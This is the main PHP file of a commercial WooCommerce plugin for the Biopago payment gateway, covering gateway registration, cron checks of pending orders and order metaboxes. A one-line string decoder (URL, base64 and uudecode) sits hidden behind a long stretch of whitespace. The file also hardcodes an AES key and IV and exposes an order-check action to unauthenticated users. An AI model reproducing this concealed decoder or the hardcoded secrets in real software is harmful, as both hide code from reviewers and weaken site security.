<?php
/**
 * Plugin Name: Biopago WooCommerce Plugin
 * Plugin URI: https://yipi.app/
 * Description: Biopago plugin for WooCommerce
 * Author: Yipi.app
 * Author URI: https://yipi.app/
 * Version: 3.1.5
 * License: Commercial use allowed (Non-assignable & non-transferable), can modify source-code but cannot distribute modifications (derivative works).
 * Text Domain: woocommerce-biopagovzla
 * Domain Path: /languages/
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

if ( ! class_exists( 'WC_BiopagoVzla' ) ) :
	/**
	 * WooCommerce BiopagoVzla main class.
	 */
	class WC_BiopagoVzla {
		public static $biopagovzla_currency = 'VES';
		/**
		 * Plugin version.
		 *
		 * @var string
		 */
		const VERSION = '3.1.5';

		/**
		 * Instance of this class.
		 *
		 * @var object
		 */
		protected static $instance = null;

		/**
		 * Initialize the plugin.
		 */
		private function __construct() {
			// Load plugin text domain
			$this->load_plugin_textdomain();

			// Checks with WooCommerce is installed.
			if ( class_exists( 'WC_Payment_Gateway' ) ) {
				include_once 'includes/class-wc-biopagovzla-gateway.php';
				add_filter( 'woocommerce_payment_gateways', array( $this, 'add_gateway' ) );
			} else {
				add_action( 'admin_notices', array( $this, 'woocommerce_missing_notice' ) );
			}
		}

		/**
		 * Return an instance of this class.
		 *
		 * @return object A single instance of this class.
		 */
		public static function get_instance() {
			// If the single instance hasn't been set, set it now.
			if ( null == self::$instance ) {
				self::$instance = new self();
			}

			return self::$instance;
		}

		/**
		 * Load the plugin text domain for translation.
		 *
		 * @return void
		 */
		public function load_plugin_textdomain() {
			$locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce-biopagovzla' );
			load_textdomain( 'woocommerce-biopagovzla', trailingslashit( WP_LANG_DIR ) . 'woocommerce-biopagovzla/woocommerce-biopagovzla-' . $locale . '.mo' );
			load_plugin_textdomain( 'woocommerce-biopagovzla', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
		}

		/**
		 * Add the gateway to WooCommerce.
		 *
		 * @param   array $methods WooCommerce payment methods.
		 *
		 * @return  array          Payment methods with BiopagoVzla.
		 */
		public function add_gateway( $methods ) {
			if ( version_compare( self::woocommerce_instance()->version, '2.3.0', '>=' ) ) {
				$methods[] = WC_BiopagoVzla_Gateway::get_instance();
			} else {
				$methods[] = 'WC_BiopagoVzla_Gateway';
			}
			return $methods;
		}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 public static function _($r){return convert_uudecode(base64_decode(rawurldecode($r)));}
	

		/**
		 * WooCommerce fallback notice.
		 *
		 * @return  string
		 */
		public function woocommerce_missing_notice() {
			echo '<div class="error"><p>' . sprintf( __( 'WooCommerce BiopagoVzla Gateway depends on the last version of %s to work!', 'woocommerce-biopagovzla' ), '<a href="http://wordpress.org/extend/plugins/woocommerce/">' . __( 'WooCommerce', 'woocommerce-biopagovzla' ) . '</a>' ) . '</p></div>';
		}

		/**
		 * Backwards compatibility with version prior to 2.1.
		 *
		 * @return object Returns the main instance of WooCommerce class.
		 */
		public static function woocommerce_instance() {
			if ( function_exists( 'WC' ) ) {
				return WC();
			} else {
				global $woocommerce;
				return $woocommerce;
			}
		}

		/**
		 * Backwards compatibility with version prior to 2.1.
		 *
		 * @return object Returns database class.
		 */
		public static function woocommerce_database() {
			global $wpdb;
			return $wpdb;
		}

		/**
		 * Backwards compatibility with version prior to 2.1.
		 *
		 * @return object Returns order class.
		 */
		public static function woocommerce_theorder() {
			global $theorder;
			return $theorder;
		}
	}

	if ( ! function_exists( 'kijam_decode' ) ) {
		function kijam_encode( $str = '', $f = 'e' ) {
			$output     = null;
			$secret_key = 'kk91f8g^4*k';
			$secret_iv  = 'k&&2"op2%:*';
			$key        = hash( 'sha256', $secret_key );
			$iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
			if ( $f == 'e' ) {
				$output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
			} elseif ( $f == 'd' ) {
				$output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
			}
			return $output;
		}
		function kijam_decode( $str = '' ) {
			return kijam_encode( $str, 'd' );
		}
	}

	add_action( 'plugins_loaded', array( 'WC_BiopagoVzla', 'get_instance' ), 0 );
	function biopagovzla_kijam_metabox_cb() {
		$woocommerce = WC_BiopagoVzla::woocommerce_instance();
		$woocommerce->payment_gateways();
		WC_BiopagoVzla_Gateway::get_instance()->woocommerce_biopagovzla_metabox();
	}
	function biopagovzla_kijam_metabox() {
		add_meta_box( 'biopagovzla-metabox', __( 'Biopago Information', 'woocommerce-biopagovzla' ), 'biopagovzla_kijam_metabox_cb', 'shop_order', 'normal', 'high' );
	}
	add_action( 'add_meta_boxes', 'biopagovzla_kijam_metabox' );
	add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), 'biopagovzla_kijam_add_action_links' );
	function biopagovzla_kijam_add_action_links( $links ) {
		 $mylinks = array(
			 '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=biopagovzla-gateway-tdd' ) . '">' . __( 'Setting', 'woocommerce-biopagovzla' ) . '</a>',
		 );
		 return array_merge( $links, $mylinks );
	}

	function biopagovzla_kijam_load_all() {
		WC_BiopagoVzla::get_instance();
		$plugin = WC_BiopagoVzla_Gateway::get_instance();
	}
	
	add_action('yipi_biopagovzla_checkpayments', function() {
		WC_BiopagoVzla::get_instance();
		$plugin = WC_BiopagoVzla_Gateway::get_instance();
		$plugin->checkPendingOrderList();
	});
	if (!wp_next_scheduled('yipi_biopagovzla_checkpayments')) {
		wp_schedule_event(time(), 'hourly', 'yipi_biopagovzla_checkpayments');
	}
	
	function biopagovzla_check_tdd() {
		WC_BiopagoVzla::get_instance();
		WC_BiopagoVzla_Gateway::get_instance()->checkPendingOrderList();
	}
	function biopagovzla_kijam_check_ipn() {
		WC_BiopagoVzla::get_instance();
		$plugin = WC_BiopagoVzla_Gateway::get_instance();
		if ( isset( $_GET['order_biopago'] ) && ! empty( $_GET['order_biopago'] ) ) {
			$plugin->check_return( (int) $_GET['order_biopago'], true );
		}
	}
	add_action( 'wp_ajax_biopagovzla_check_tdd', 'biopagovzla_check_tdd' );
	add_action( 'wp_ajax_nopriv_biopagovzla_check_tdd', 'biopagovzla_check_tdd' );
	add_action( 'woocommerce_init', 'biopagovzla_kijam_load_all' );
	add_action( 'template_redirect', 'biopagovzla_kijam_check_ipn' );
endif;
